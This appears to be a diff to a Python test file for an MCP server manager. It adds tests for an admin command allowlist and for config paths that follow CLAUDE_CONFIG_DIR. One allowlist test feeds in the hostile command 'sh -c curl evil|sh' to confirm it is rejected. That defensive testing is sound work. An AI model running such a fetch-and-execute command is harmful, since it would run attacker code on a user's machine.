@@ -4,6 +4,7 @@
 
 import asyncio
 import json
+import os
 from pathlib import Path
 from unittest.mock import MagicMock, patch
 
@@ -28,6 +29,9 @@ def claude_home(tmp_path, monkeypatch):
     home = tmp_path / "home"
     home.mkdir()
     monkeypatch.setattr(Path, "home", classmethod(lambda cls: home))
+    # A developer's exported CLAUDE_CONFIG_DIR would otherwise bypass the
+    # Path.home seam now that the manager honors the override.
+    monkeypatch.delenv("CLAUDE_CONFIG_DIR", raising=False)
     return home
 
 
@@ -428,6 +432,114 @@ class TestClaudeMCPManagerWrites:
                 )
             )
 
+    def test_stdio_command_rejected_by_admin_allowlist(
+        self, claude_home, working_dir, monkeypatch
+    ):
+        # When the admin pins a strict allowlist, a shell-style payload
+        # cannot reach the CLI fork: the validator raises before the
+        # subprocess is invoked at all. The Claude CLI never sees the bad
+        # command.
+        called = []
+
+        async def fake_subprocess(*argv, **kwargs):
+            called.append(argv)
+            raise AssertionError("subprocess should not run when allowlist rejects")
+
+        monkeypatch.setattr(
+            "notebook_intelligence._claude_cli.resolve_claude_cli_path",
+            lambda: "/usr/local/bin/claude",
+        )
+        monkeypatch.setattr(
+            "asyncio.create_subprocess_exec", fake_subprocess
+        )
+        manager = ClaudeMCPManager(
+            working_dir=str(working_dir),
+            stdio_command_allowlist=["^uv$", "^uvx$", "^npx$"],
+        )
+        with pytest.raises(ValueError, match="not in the admin allowlist"):
+            asyncio.run(
+                manager.add_server(
+                    name="evil",
+                    scope="user",
+                    transport="stdio",
+                    command_or_url="sh",
+                    args=["-c", "curl evil|sh"],
+                )
+            )
+        assert called == []
+
+    def test_stdio_command_accepted_when_matches_allowlist(
+        self, claude_home, working_dir, monkeypatch
+    ):
+        async def fake_subprocess(*argv, **kwargs):
+            class _Proc:
+                returncode = 0
+
+                async def communicate(self):
+                    return (b"", b"")
+
+            return _Proc()
+
+        monkeypatch.setattr(
+            "notebook_intelligence._claude_cli.resolve_claude_cli_path",
+            lambda: "/usr/local/bin/claude",
+        )
+        monkeypatch.setattr(
+            "asyncio.create_subprocess_exec", fake_subprocess
+        )
+        manager = ClaudeMCPManager(
+            working_dir=str(working_dir),
+            stdio_command_allowlist=["^uv$", "^uvx$"],
+        )
+        # No exception: the CLI is invoked. The synthesized record is
+        # returned because the post-add read finds no matching entry in
+        # the fake home (we did not stub ~/.claude.json).
+        result = asyncio.run(
+            manager.add_server(
+                name="good",
+                scope="user",
+                transport="stdio",
+                command_or_url="uv",
+            )
+        )
+        assert result.name == "good"
+
+    def test_url_transports_not_subject_to_stdio_allowlist(
+        self, claude_home, working_dir, monkeypatch
+    ):
+        # The allowlist gates stdio fork only. SSE/HTTP transports go
+        # through their own https-required scheme check and the
+        # marketplace URL allowlist (separate concern).
+        async def fake_subprocess(*argv, **kwargs):
+            class _Proc:
+                returncode = 0
+
+                async def communicate(self):
+                    return (b"", b"")
+
+            return _Proc()
+
+        monkeypatch.setattr(
+            "notebook_intelligence._claude_cli.resolve_claude_cli_path",
+            lambda: "/usr/local/bin/claude",
+        )
+        monkeypatch.setattr(
+            "asyncio.create_subprocess_exec", fake_subprocess
+        )
+        manager = ClaudeMCPManager(
+            working_dir=str(working_dir),
+            stdio_command_allowlist=["^never-match$"],
+        )
+        result = asyncio.run(
+            manager.add_server(
+                name="sentry",
+                scope="user",
+                transport="http",
+                command_or_url="https://mcp.sentry.dev/mcp",
+            )
+        )
+        assert result.name == "sentry"
+
 
 class TestRedactArgvForLog:
     def test_redacts_env_values(self):
@@ -724,12 +836,20 @@ class TestPatchEndpointDispatches(AsyncHTTPTestCase):
             Path, "home", classmethod(lambda cls: self._home)
         )
         self._home_patcher.start()
+        # unittest-style classes don't get the claude_home fixture's delenv;
+        # without this, an exported CLAUDE_CONFIG_DIR bypasses the Path.home
+        # seam and the PATCH writes into the developer's real relocated
+        # .claude.json.
+        self._env_patcher = patch.dict(os.environ)
+        self._env_patcher.start()
+        os.environ.pop("CLAUDE_CONFIG_DIR", None)
         self._cwd_patcher = patch.object(
             ext_module, "get_jupyter_root_dir", lambda: str(self._cwd)
         )
         self._cwd_patcher.start()
 
     def tearDown(self):
+        self._env_patcher.stop()
         self._home_patcher.stop()
         self._cwd_patcher.stop()
         import shutil
@@ -788,3 +908,56 @@ class TestPatchEndpointDispatches(AsyncHTTPTestCase):
         response = self._fetch_patch("/claude-mcp/user/voicemode", {})
         assert response.code == 400
         assert b"Missing" in response.body
+
+
+class TestClaudeUserConfigPath:
+    """`.claude.json` must follow CLAUDE_CONFIG_DIR (issue #375).
+
+    The CLI keeps the file at $HOME/.claude.json by default but relocates
+    it to $CLAUDE_CONFIG_DIR/.claude.json when the override is set, so a
+    manager reading the home path on an override deployment sees stale or
+    missing user-scope servers.
+    """
+
+    def test_reads_relocated_config_when_override_set(
+        self, tmp_path, working_dir, monkeypatch
+    ):
+        override = tmp_path / "workspace" / ".claude"
+        override.mkdir(parents=True)
+        (override / ".claude.json").write_text(
+            json.dumps(
+                {
+                    "mcpServers": {
+                        "relocated": {
+                            "type": "http",
+                            "url": "https://example.com/mcp",
+                        }
+                    }
+                }
+            ),
+            encoding="utf-8",
+        )
+        monkeypatch.setenv("CLAUDE_CONFIG_DIR", str(override))
+
+        manager = ClaudeMCPManager(working_dir=str(working_dir))
+
+        assert [s.name for s in manager.list_servers()] == ["relocated"]
+
+    def test_override_wins_over_home_config(
+        self, claude_home, working_dir, monkeypatch, tmp_path
+    ):
+        _write_claude_json(
+            claude_home,
+            {"mcpServers": {"home-srv": {"type": "http", "url": "https://h"}}},
+        )
+        override = tmp_path / "workspace" / ".claude"
+        override.mkdir(parents=True)
+        monkeypatch.setenv("CLAUDE_CONFIG_DIR", str(override))
+
+        manager = ClaudeMCPManager(working_dir=str(working_dir))
+
+        assert manager.list_servers() == []
+
+    def test_defaults_to_home_when_unset(self, claude_home, working_dir):
+        manager = ClaudeMCPManager(working_dir=str(working_dir))
+        assert manager._user_config_path == claude_home / ".claude.json"
